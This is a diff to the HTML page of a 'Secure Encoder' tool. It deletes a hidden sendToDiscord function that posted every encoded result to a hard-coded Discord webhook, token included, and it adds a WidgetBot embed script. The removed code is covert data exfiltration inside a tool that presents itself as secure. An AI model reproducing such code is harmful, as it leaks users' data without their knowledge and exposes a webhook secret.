@@ -81,7 +81,6 @@
             if (text && password) {
                 const encodedText = await encodeText(text, password, type);
                 document.getElementById('result').innerText = encodedText;
-                sendToDiscord(encodedText);
             } else {
                 alert("Please enter text and password to encode.");
             }
@@ -117,28 +116,8 @@
                 console.error('Failed to paste: ', err);
             });
         }
-
-        function sendToDiscord(message) {
-            const webhookUrl = "https://discord.com/api/webhooks/1356427422794387557/kyb4T-v99_cVWYxXBOjkmRdOG-AAmgR8Z5BDa0V-C19yFxBloddAE38f1YrwXr43bgfi";
-            const payload = JSON.stringify({ content: message });
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: payload
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Message sent to Discord');
-                } else {
-                    console.error('Failed to send message to Discord');
-                }
-            }).catch(error => {
-                console.error('Error sending message to Discord', error);
-            });
-        }
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/@widgetbot/html-embed"></script>
 </head>
 <body>
     <h1>Secure Encoder</h1>
